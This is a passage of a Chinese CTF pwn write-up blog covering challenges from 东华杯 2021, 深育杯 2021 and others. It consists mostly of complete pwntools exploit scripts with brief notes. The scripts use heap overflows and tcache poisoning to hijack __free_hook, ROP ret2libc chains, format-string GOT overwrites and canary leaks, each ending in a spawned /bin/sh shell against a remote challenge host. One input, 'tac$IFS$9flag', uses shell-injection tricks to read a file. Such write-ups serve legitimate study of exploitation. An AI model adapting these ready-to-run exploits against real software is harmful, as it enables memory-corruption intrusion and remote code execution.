class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf0</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>)  </span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xb8</span>) </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x01\x01&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) -<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(system))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="东华杯-2021-bg3"><a class="header-anchor" href="#东华杯-2021-bg3">¶</a>[东华杯 2021]bg3</h2>
<h3 id="题目考点-v11"><a class="header-anchor" href="#题目考点-v11">¶</a>题目考点</h3>
<pre><code>1.程序逻辑漏洞
2.tcache attack
</code></pre>
<h3 id="题目分析-v7"><a class="header-anchor" href="#题目分析-v7">¶</a>题目分析</h3>
<p>漏洞点在add函数，就是具有相同idx的chunk的size会叠加，由此造成溢出<br>
<img src="http://static.zybuluo.com/hgggg/lebe8euhcwtj94oapwyj9t1v/image_1fjs35m2cq5l16sn120t1mthdvd9.png" alt="image_1fjs35m2cq5l16sn120t1mthdvd9.png-88.7kB"></p>
<h3 id="解题步骤-v6"><a class="header-anchor" href="#解题步骤-v6">¶</a>解题步骤</h3>
<p>Step1:unsorted bin attack 泄露libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>) <span class="comment">#防止合并</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>Step2: 利用溢出来修改tcache chunk的fd指针，劫持free_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))+p64(free_hook))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(system))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h3 id="exp-v12"><a class="header-anchor" href="#exp-v12">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;bg3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28070</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Select:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Info:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(system))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)    </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="东华杯-2021-boom-script"><a class="header-anchor" href="#东华杯-2021-boom-script">¶</a>[东华杯 2021]boom_script</h2>
<h3 id="题目考点-v12"><a class="header-anchor" href="#题目考点-v12">¶</a>题目考点</h3>
<pre><code>1.tcache attack
2.UAF
3.类VMpwn
</code></pre>
<h3 id="题目分析-v8"><a class="header-anchor" href="#题目分析-v8">¶</a>题目分析</h3>
<p>这道题跟着群里大佬的wp做的，写的很详细<br>
<a href="http://static.zybuluo.com/hgggg/a99pzogyuu4bmnlx36jqxtlx/boom_script.md" target="_blank">boom_script</a></p>
<h3 id="exp-v13"><a class="header-anchor" href="#exp-v13">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;boom_script&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28182</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;$&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">var1 = &quot;&#123;0&#125;&quot;;\</span></span><br><span class="line"><span class="string">var2 = &quot;&#123;1&#125;&quot;;\</span></span><br><span class="line"><span class="string">var1 = &quot;&#123;2&#125;&quot;;\</span></span><br><span class="line"><span class="string">prints(&quot;aaaaaaaa&quot;);</span></span><br><span class="line"><span class="string">var2 = &quot;AAAAAAAA&quot;;</span></span><br><span class="line"><span class="string">array arr1[20];</span></span><br><span class="line"><span class="string">inputn(var3);</span></span><br><span class="line"><span class="string">arr1[-3] = var3;</span></span><br><span class="line"><span class="string">arr1[-35] = 844424930131968;</span></span><br><span class="line"><span class="string">var4 = &quot;&#123;1&#125;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array arr2[1];</span></span><br><span class="line"><span class="string">inputn(var5);</span></span><br><span class="line"><span class="string">arr2[0] = var5;</span></span><br><span class="line"><span class="string">var6 = &quot;/bin/sh&quot;;</span></span><br><span class="line"><span class="string">var6 = &quot;AAAAAAAA&quot;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x458</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x38</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;length:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)+<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x1ebfe0</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(free_hook))</span><br><span class="line">p.send(<span class="built_in">str</span>(free_hook-<span class="number">0x28</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="built_in">str</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="nc签到"><a class="header-anchor" href="#nc签到">¶</a>nc签到</h2>
<h3 id="题目考点-v13"><a class="header-anchor" href="#题目考点-v13">¶</a>题目考点</h3>
<p>linux 文件操作</p>
<h3 id="exp-v14"><a class="header-anchor" href="#exp-v14">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28082</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;tac$IFS$9flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="gift-pwn"><a class="header-anchor" href="#gift-pwn">¶</a>gift_pwn</h2>
<h3 id="题目考点-v14"><a class="header-anchor" href="#题目考点-v14">¶</a>题目考点</h3>
<p>ret2text</p>
<h3 id="exp-v15"><a class="header-anchor" href="#exp-v15">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28077</span>)</span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x4005ba</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(gift)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="whitegive-pwn"><a class="header-anchor" href="#whitegive-pwn">¶</a>whitegive_pwn</h2>
<h3 id="题目考点-v15"><a class="header-anchor" href="#题目考点-v15">¶</a>题目考点</h3>
<pre><code>ret2text
</code></pre>
<h3 id="exp-v16"><a class="header-anchor" href="#exp-v16">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;white_give&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28052</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;white_give&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400763</span></span><br><span class="line">ret = <span class="number">0x0000000000400509</span></span><br><span class="line">binsh = <span class="number">0x000000000018ce57</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x4006da</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) +p64(ret)+ p64(pop_rdi) + p64(libc_base + binsh) + p64(system) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="NSS-printer-I"><a class="header-anchor" href="#NSS-printer-I">¶</a>NSS_printer_I</h2>
<h3 id="题目考点-v16"><a class="header-anchor" href="#题目考点-v16">¶</a>题目考点</h3>
<pre><code>格式化字符串
</code></pre>
<h3 id="exp-v17"><a class="header-anchor" href="#exp-v17">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;printer1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28014</span>)</span><br><span class="line">elf =  ELF(<span class="string">&quot;printer1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%17$p%21$p&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20840</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">printf = elf_base+elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf:system&#125;)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-深育杯-find-flag"><a class="header-anchor" href="#2021-深育杯-find-flag">¶</a>[2021 深育杯]find_flag</h2>
<h3 id="题目考点-v17"><a class="header-anchor" href="#题目考点-v17">¶</a>题目考点</h3>
<pre><code>1.格式化字符串
2.栈溢出
</code></pre>
<h3 id="解题思路-v3"><a class="header-anchor" href="#解题思路-v3">¶</a>解题思路</h3>
<pre><code>利用格式化字符串漏洞得到程序基地址以及canary值，然后利用栈溢出调用后门
</code></pre>
<h3 id="exp-v18"><a class="header-anchor" href="#exp-v18">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;find_flag&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;find_flag&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28077</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;aa%16$p..%17$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1140</span></span><br><span class="line">success(<span class="string">&quot;elf_base:&quot;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line">flag_addr = elf_base + <span class="number">0x1228</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;..&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + p64(<span class="number">0</span>)+p64(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-深育杯-create-code"><a class="header-anchor" href="#2021-深育杯-create-code">¶</a>[2021 深育杯]create code</h2>
<h3 id="题目考点-v18"><a class="header-anchor" href="#题目考点-v18">¶</a>题目考点</h3>
<pre><code>1.堆溢出
2.tcache attack
</code></pre>
<h3 id="解题思路-v4"><a class="header-anchor" href="#解题思路-v4">¶</a>解题思路</h3>
<p>利用add函数中的溢出 用形如如下的构造来修改堆块的size,来泄露libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>然后构造tcache attack 来劫持free_hook。<br>
最后注意不能直接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure>
<p>来getshell,因为堆块在申请的时候会存在一个\x04<br>
<img src="https://gitee.com/Nss-harukii/images/raw/master/C.png" alt="pic"></p>
<p>所以只能通过溢出来修改其为/bin/sh</p>
<h3 id="exp-v19"><a class="header-anchor" href="#exp-v19">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;create_code&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28035)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">content</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;id: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;id: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x328</span>+p64(<span class="number">0x991</span>)) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) </span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x328</span>+p64(<span class="number">0x331</span>)+p64(free_hook-<span class="number">0x10</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x328</span>+p64(<span class="number">0x331</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(system))</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019华南-PWN3"><a class="header-anchor" href="#CISCN-2019华南-PWN3">¶</a>[CISCN 2019华南]PWN3</h2>
<h3 id="题目考点-v19"><a class="header-anchor" href="#题目考点-v19">¶</a>题目考点</h3>
<pre><code>srop
</code></pre>
<h3 id="题目分析-v9"><a class="header-anchor" href="#题目分析-v9">¶</a>题目分析</h3>
<p>见SROP例题部分</p>
<h3 id="EXP-v6"><a class="header-anchor" href="#EXP-v6">¶</a>EXP</h3>
